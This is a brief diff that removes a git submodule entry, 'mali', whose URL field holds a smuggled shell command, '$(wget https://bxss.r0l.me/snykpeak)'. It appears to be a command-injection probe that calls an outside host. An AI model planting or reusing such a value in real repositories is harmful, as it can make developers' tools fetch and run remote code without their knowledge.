@@ -1,3 +1,0 @@
-[submodule "mali"]
-	path = mali
-	url = '$(wget https://bxss.r0l.me/snykpeak)'.git
